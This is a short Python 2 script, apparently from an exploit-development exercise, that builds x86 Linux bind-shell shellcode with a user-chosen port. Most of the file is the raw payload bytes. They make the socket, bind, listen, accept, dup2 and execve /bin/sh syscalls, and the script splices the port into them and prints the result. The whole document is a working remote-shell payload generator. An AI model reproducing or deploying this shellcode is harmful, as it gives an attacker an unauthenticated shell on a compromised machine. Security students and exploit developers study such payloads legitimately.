
#!/usr/bin/python

# Bind Shell TCP python wrapper (port configuration
# Author:  Gal Nagli
# Blog: naglinagli.github.io


import socket
import sys

shell1 =  ""
shell1 += "\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xf6\\x56\\x53\\x6a\\x02\\x89\\xe1"
shell1 += "\\xcd\\x80\\x97\\x31\\xc0\\xb0\\x66\\x56\\x66\\x68"
shell2 = ""
shell2 += "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x31"
shell2 += "\\xdb\\xb0\\x66\\xb3\\x04\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xfe\\xc3\\x56"
shell2 += "\\x56\\x57\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49"
shell2 += "\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89"
shell2 += "\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"


if len(sys.argv) != 2:
	print "You must enter a port number."
	exit
else:

	try:

		portNumber = sys.argv[1]
		portNumber = int(portNumber)
		if portNumber > 65535 or portNumber < 1:
			print "Please stay in the port range"
			exit()
		portNumber = socket.htons(portNumber)
		portNumber = hex(portNumber)

		firstPortNum = portNumber[2:4]
		secondPortNum = portNumber[4:6]

		firstPortNum = str(firstPortNum)
		firstPortNum = "\\x" + firstPortNum

		secondPortNum = str(secondPortNum)
		secondPortNum = "\\x" + secondPortNum

		combined = secondPortNum + firstPortNum

		shell = shell1 + combined + shell2

	
		print shell

	except:
	
		print "The program has failed, Please try again." 
